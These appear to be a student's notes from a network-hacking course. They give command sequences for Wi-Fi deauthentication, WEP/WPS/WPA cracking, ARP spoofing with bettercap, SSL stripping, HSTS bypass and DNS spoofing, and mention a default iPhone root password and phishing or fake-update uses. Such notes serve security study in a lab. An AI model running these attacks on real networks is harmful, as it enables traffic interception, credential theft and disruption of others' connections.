# Notes

## Lab
- VirtualBox - https://www.virtualbox.org/wiki/Downloads
- Install VM VirtualBox Extension Pack - Support for USB 2.0 and USB 3.0 devices
- custom kali linux -> https://zsecurity.org/download-custom-kali/
  - Network -> NATNetwork
  - How To Fix Nat Network Issue In Virtual Box -> https://www.youtube.com/watch?v=y0PMFg-oAEs
  - https://zsecurity.org/got-a-blank-screen-after-importing-kali-in-virtual-box-heres-how-to-fix-it/
  - Installing Kali 2017.1 In Virtual Box In Less Than 3 Minutes -> https://www.youtube.com/watch?v=TU-TgF_UnAI
  - save snapshot after first setup
  - kali tools doc -> https://tools.kali.org/tools-listing
  - windows VM -> https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/
  - wireless adapter -> VM settings -> ports -> select usb controller -> add
  - ifconfig -> will show newly added adapter (ex: wlan0)
- Windows as Virtual machine:
  - https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/

# Network Penetration Testing/Hacking
- Pre Connection attack
- Gaining Access
- Post connection attack

## change Mac address
- Increase anonymity
- Impersonate other devices
- Bypass filters
- steps:
```
  - ifconfig (look for the newly added adapter, ex: wlan0), need to change the ether field
  - disable network -> ifconfig wlan0 down
  - ifconfig waln0 hw ether 11:22:33:44:55
  - enable network -> ifconfig wlan0 up
  - check -> ifconfig
  - it will reset after restarting
```

## Change to Monitor mode
- by default device only listens data which has the mac address in destination fields of the messages
- capture all the data transferred in the air within range by changing to Monitor mode
- steps:
```
  - iwconfig -> to see wireless interface only
  - by default mode is Managed mode
  - ifconfig waln0 down
  - kill any process which may interfere in Monitor mode (kills all connection but connection not required in pre-connection attacks)
    - command -> airmon-ng check kill
  - iwconfig wlan0 mode monitor
  - ifconfig wlan0 up
  - check -> iwconfig
```

# Pre-connection attack
## Packet Sniffing (Using Airodump-ng)
- Part of the aircrack-ng suit.
- Airodump-ng is a packet sniffer;
- Used to capture all packets within range.
- Display detailed info about networks around us.
- Connected clients ….etc
- use:
```
  - check network interfere name -> iwconfig
  - airodump-ng [MonitorModeInterface]
  - https://tools.kali.org/wireless-attacks/airodump-ng
  - output details -> https://www.aircrack-ng.org/doku.php?id=airodump-ng
  - airodump-ng --band a [MonitorModeInterface] (capture 5gz frequency)
  - airodump-ng --band abg [MonitorModeInterface] (capture 2.4gz and 5gz frequency both)
```

## Network Hacking - Sniffing data for single Network device
```
- airodump-ng mon0
- airodump-ng -bssid FC:15:B4:00:00:00 --channel 2 --write test mon0
```
- details:
  - sniff data from specific bssid : FC:15:B4:00:00:00
  - listen data on channel : 2
  - write all the data to file: Test
  - wireless adapter in monitor mode : mon0
- wireshark -> open test-01.cap file

## Deauthentication Attack
- Disconnect any client from any network
- Works on encrypted networks (WEP, WPA & WPA2).
- No need to know the network key.
- No need to connect to the network.
- use:
```
  - aireplay-ng --deauth [#DeauthPackets] -a [NetworkMac] -c [TargetMac] [Interface]
  - aireplay-ng --deauth 10000000 -a FC:15:B4:00:00:00 -c FF:FF:FF:00:00:00 mon0
  - https://tools.kali.org/wireless-attacks/aireplay-ng
```
- theory:
  - Impersonate as client to access point(router) to Disconnect (by changeing self mac to client mac)
  - Impersonate as access point(router) to client to disconnect on client request (changing mac to router's mac)

## Gaining Access - WEP Cracking
- details:
  - Wired equivalent Privacy
  - Old encryption, uses RC4 algorithm
  - easily cracked
- theory:
  - Client encrypts data using a key
    - Each packet is encrypted using a unique key stream
    - Random initialization vector (IV) is used to generate the keys streams
    - The initialization vector is only 24 bits!
    - IV + Key (password) = Key stream
    - Keystream + "Data to send to the router” = ASDKASDIASDJA
  - Encrypted packet sent in the air.
    - IV is sent with data in plain format
  - Router decrypts packet using the key
- weakness:
  - IV is too small (only 24 bits)
  - IV is sent in plain text
- Conclusion:
  - To crack WEP we need to:
  - Capture a large number of packets/IVs → using airodump-ng
  - Analyse the captured IVs and crack the key  → using aircrack-ng
  - Problem:
    - If network is not busy
    - It would take some time to capture enough IVs
  - Solution:
    - Force the AP to generate new IVs (Fake Authentication and ARP Request Replay)
- steps:
```
  - airodump-ng -bssid FC:15:B4:00:00:00 --channel 1 --write basic_wep mon0
  - aircrack-ng basic_wep-01.cap
  - use Ascii key or hex key with all semicolon removed to connection to device
```

## Fake Authentication Attack
- If network is not busy -> we need Force the AP(Access Point) to generate new IVs (Fake Authentication)
- we need to associate to the Network (tell the network that we want to communicate with it, by default access point ignore requests they get unless the device is connected to them or associated with it)
- command:
```
  - monitor -> airodump-ng -bssid FC:15:B4:00:00:00 --channel 1 --write arp_replay mon0
  - run attack -> aireplay-ng --fakeauth 0 -a FC:15:B4:00:00:00 -h 11:22:33:44:55:55 mon0
  - FC:15:B4:00:00:00 is the target access point
  - 11:22:33:44:55 my wireless adapter mac address
  - can get: ifconfig ->  first 12 digitals of unspec field, replace - with :
```

## WEP Cracking - ARP Request Replay Attack
- run airodump-ng againest the target network
- command -> airodump-ng -bssid FC:15:B4:00:00:00 --channel 1 --write arp_replay mon0
- associate with target network with Fake Authentication  
- Run ARP Replay attack
- command -> aireplay-ng --arpreplay -b FC:15:B4:00:00:00 -h 11:22:33:44:55:55 mon0
- it will:
  - Wait for an ARP packet
  - Capture it, and replay it (retransmit it)
  - This causes the AP to produce another packet with a new IV
  - Keep doing this till we have enough IVs to crack the key
- after a large number of IV got transmitted, associate ones more and then do aircrack
- command -> aireplay-ng --fakeauth 0 -a FC:15:B4:00:00:00 -h 11:22:33:44:55:55 mon0
- command -> aircrack-ng arp_replay-01.cap
- IV can be 64 or 128bit Length
- aircrack-ng may require more IV packets

## Introduction WPA and WPA2 Cracking
- Both can be cracked using the same methods
- Made to address the issues in WEP.
- Much more secure.
- Each packet is encrypted using a unique temporary key.
- Packets contain no useful information.

## WPA / WPA2 Cracking - Exploiting WPS (Cracking without Wordlist)
- WPS is a feature that can be used with WPA & WPA2.
- Allows clients to connect without the password.
- Authentication is done using an 8 digit pin.
- 8 Digits is very small.
- We can try all possible pins in relatively short time.
- Then the WPS pin can be used to compute the actual password.
- PS: This only works if the router is configured not to use PBC (Push Button
Authentication).
- process:
```
# tool to check all the networks around me with WPS enabled
$ wash --interface [NetworkInterfaceInMonitorMode]
# do fake Authentication attack (to associate with network)
$ aireplay-ng --fakeauth 30 -a [TargetMacAddr] -h [MyWifiAdaptorMacAddr] [NetworkInterfaceInMonitorMode]
$ aireplay-ng --fakeauth 30 -a FC:15:B4:00:00:00 -h 11:22:33:44:55:55 mon0
# in another terminal call program reaver to bruteforce the pin
$reaver --bssid [TargetNetworkMacAddr] --channel [TargetNetworkChannel] --interface [NetworkInterfaceInMonitorMode]  -vvv --no-associate
# --no-associate because we are doing association separately
# first start reaver than airplay-ng
# reaver will give WPS key and WPA PIN
## reaver older version added in repo.. link for latest version: https://ufile.io/lro4nkdv (might have a bug)
```

## WPA / WPA2 Cracking - NO WPS enabled (Cracking with Wordlist)
- Packets contain no useful data
- Only packets that can aid with the cracking process are the handshake
packets.
  - These are 4 packets sent when a client connects to the network.
- The handshake does not contain data the helps recover the key.
- It contains data that can be used to check weather a key is valid or
not.
- Two things needed to crack WPA/WPA2 :
  - 4-way handshake.
  - Wordlist.
- password and these information are used to generate MIC:
  - SP Address
  - STA Address
  - AP Nonce
  - STA Nonce
  - EAPOL
  - Payload
- we matches our generated MIC with retrieved MIC
- MIC is used by access point to verifiy if password is correct or not
- **Capturing the WPA / WPA2 handshape**
```
airodump-ng -bssid [TargetNetworkMacAddr] --channel [TargetNetworkChannel] --write [output_file_name] [MonitorModeInterface]
# now wait for new clients to connect to capture the handshake
# or do De-authentication attack on a client so that when it reconnects, we'll capture the handshake
# handshake will be stored in output_file
```
- Some wordlist:
```
ftp://ftp.openwall.com/pub/wordlists/
http://www.openwall.com/mirrors/
https://github.com/danielmiessler/SecLists
http://www.outpost9.com/files/WordLists.html
http://www.vulnerabilityassessment.co.uk/passwords.htm
http://packetstormsecurity.org/Crackers/wordlists/
http://www.ai.uga.edu/ftplib/natural-language/moby/
http://www.cotse.com/tools/wordlists1.htm
http://www.cotse.com/tools/wordlists2.htm
http://wordlist.sourceforge.net/
```
- Creating a Wordlist:
```
Crunch can be used to create a wordlist.
Syntax:
crunch [min] [max] [characters] -t [pattern] -o [FileName]
Example:
crunch 6 8 123abc$ -i wordlist -t a@@@@b
Generated passes:
aaaaab
aabbbb
aan$$b
```
- cracking using aircrack-ng:
```
$aircrack-ng output_file.cap -w wordlist.txt
#handshake is stored in output_file.cap
#WordLists is stored in wordlist.txt
```
- Note: social Engineering (evil twin attacks) can be used to get the password from a client

# Post Connection attack

## Information gathering
- Discovering Devices connected to same network:
```
netdisconver -r 10.0.2.1/24
# will discover all IPs from 10.0.2.1 to 10.0.2.254
```
- Network Mapping (NMap), HUGE security scanner.
- From an IP/IP range it can discover:
  - Open ports.
  - Running services.
  - Operating system.
  - Connected clients.
  - and more
- run -> **zenmap**
  - put ip or ip range in target
  - profile- > details in scan
```
Hack: iPhone have no ssh open until jailbroken
username -> root
default password is -> alpine
most user doesn't know or care to change.
```

## ARP Protocol
Simple protocol used to map IP Address of a machine to its MAC address
- all communicate require a source mac addr and destination mac addr
- device A who wants to communicate with device code B
- device A broadcast an ARP request to all the device in same network, to get the mac address to a certain IP
- all device ignore and only the device with request IP responds with its MAC Address
- No verification of mac is done by requesting entity
- each computer maintain a table which link the ip addresses to mac addresses
  ```
  $ arp -a
  ```

## MITM Attack (Man in the middle attack)
any request/response to access point goes through hacker computer, can be achieved with ARP Poisoning
- we can exploit the ARP protocol
- send two requests:
  - one to access point, saying I'm the client
  - one to client (target machine/ victim), saying I'm the access point
- access point and victim will update their ARP table
- Reason: no verification is done for response

## ARP Spoofing (Using arpspoof)
- arpspoof tool to run arp spoofing attacks.
- Simple and reliable.
- Ported to most operating systems including Android and iOS.
- Usage is always the same.
- use:
  ```
  # run these commands in two shells
  arpspoof -i [interface] -t [clientIP] [gatewayIP]
  arpspoof -i [interface] -t [gatewayIP] [clientIP]
  ## requests from MITM will not go to access point, it doesn't allow due to security feature,
  port forwarding needed to do so:
  $ echo 1> /proc/sys/net/ipv4/ip_forward
  ## open wireshark to see all network traffic flow through your interface
  Note: wireshark used to monitor network traffic on its machine but as we are MITM and all traffic flows through us, we'd be able to see it
  ```

## ARP Spoofing (Using MITMf and Bettercap)
- Framework to run MITM attacks.
- Can be used to :
  - ARP Spoof targets (redirect the flow of packets)
  - Sniff data (urls, username passwords).
  - Bypass HTTPS.
  - Redirect domain requests (DNS Spoofing).
  - Inject code in loaded pages.
  - And more!
- mitmf use:
```
mitmf --arp --spoof -i [interface] --target [clientIP] --gateway [gatewayIP]
```
- bettercap use (will be using this mostly ):
```
bettercap -iface [interface]
```
## Bettercap
- get help -> bettercap --help
- a new prompt will open on command -> bettercap -iface [interface]
- type **help** to see list of modules and commands
- module -> events.stream : handle all the events running in background
- type **help module_name** to see help about module
- module -> net.probe : keep probing the new hosts on the network by sending dummy UDP packets to every possible IP in subnet
- type **module_name on** to enable a module. ex: net.probe on
- module -> net.recon : handles the response of net.probe UDP packets
- type **net.show** get all the connected clients
- module -> **arp.spoof** : for arp spoofing
- type **caplets.show** : list all caplets
- ARP spoofing:
  - net.probe on
  - set arp.spoof.fullduplex true   ( listen both side communicate from client and AP)
  - set arp.target.spoof [TargetDeviceIP]
  - apr.spoof on
- capturing all data and analysing by Bettercap
  - module -> net.sniff : anything flows through computer will be captured and analysed by this module
  - net.sniff on
- http://vulnweb.com : http sites for testingf

## ARP Spoofing (Create script - caplet):
- caplet : text file that contains all the commands
write all the command to a file and save as file_name.cap:
```
net.probe on
set arp.spoof.fullduplex true
set arp.spoof.target 192.168.0.4
arp.spoof on
set net.sniff.local true      
net.sniff on
```
- net.sniff.local : sniff all data even if its local data (in https bettercap will thinks that data is of its been sent from our own computer)
- bettercap -iface wlan0 -caplet file_name.cap

## HTTPS and bypass by bettercap
Problem:
- Data in HTTP is sent as plain text.
- A MITM can read and edit requests and responses. → not secure
Solution:
- Use HTTPS.
- HTTPS is an adaptation of HTTP.
- Encrypt HTTP using TLS (Transport Layer Security) or SSL (Secure Sockets Layer).

**Bypass HTTPS:** <br>
- Problem: Most websites use HTTPS → Sniffed data will be encrypted.
- Solution: Downgrade HTTPS to HTTP.
- bettercap provide the caplet to downgrade HTTPS to HTTP
- it has a bug (correct version added on github in same repository as hstshijack.zip)
- extract it in directory /usr/share/bettercap/caplets/ (delete existing one there)

**Downgrade HTTPS to HTTP.** (SSL Stripping) <br>
```
- bettercap -iface wlan0 -caplet start_spoof.cap    ---------> (start_spoof.cap if caplet we created above to start sniffing)
- type name of caplet to run ----> hstshijack/hstshijack
```

**HSTS** <br>
Modern web browsers comes with a list of websites that they should only load over https like facebook, twitter etc
- browser's doing this check locally, nothing can be done by MITM
**ByPass HSTS** <br>
- Trick the browser into loading a different website
- replace all links for HSTS websites with similar links
  - Ex: facebook.com -> facebook.corn
- using hsts caplet to bypass it added in repository -> hstshijack.cap
  ```
  set hstshijack.targets              -> hsts websites
  set hstshijack.replacement          -> replacements for target websites
  set hstshijack.Payload              -> js file for code injection
  ```
- running the attack:
```
bettercap -iface wlan0 -caplet start_spoof.cap
hstshijack/hstshijack
```
- if doesn't work, means site is cached, try after removing browsing Data
- will not work url is directly entered in the search bar, user needs to search the target website on search engine (let's say google.in) and then click on the link from search result to work the hsts bypassing
- script will work in background and replace all link to target website in search result
- Link to onw issue: HSTS Hijack caplet dial tcp error
  - https://www.youtube.com/watch?v=XoUPHF-wyMc&feature=youtu.be
- bettercap V2.23:
  - https://ufile.io/joxjzflg
  - alternate added in repository

## DNS Spoofing (Controlling DNS Requests on the Network)
- DNS → Domain Name System.
  - Translates domain names to IP addresses.
  - request for website goes to DNS, will in result return the IP of the server
  - Eg: links www.google.com to the IP of Google’s server. bing.com -> 204.79.197.200 etc
- when we're MITM, request first comes to us before going to DNS server.
- we give any other website in result to user's request
- works against all http and https website
- doesn't work against hsts websites

**Redirecting to Local web server for a DNS request**
```
## start local webserver (kali linux comes with default)
$ service apache2 start
## if goes to ip of linux machine, it will redirect to default page of local server
## page is stored at location -> /var/www/html/index.html
## replace the file to show the page for a request
$ bettercap -iface wlan0 -caplet start_spoof.cap
## inside bettercap terminal -> help dns.spoof
## dns.spoof.address -> redirect to this website on DNS request , default local address
$ set dns.spoof.all true
## dns.spoof.domains -> comma seperate list of domains to target
$ set dns.spoof.domains google.com,*.google.com
$ dns.spoof on
```
- use:
  - replace login page with fake page
  - redirect to another website with malware
  - server fake updates (check if user has new updates, we can DNS spoof them send them fake updates)


## Injecting Javascript code
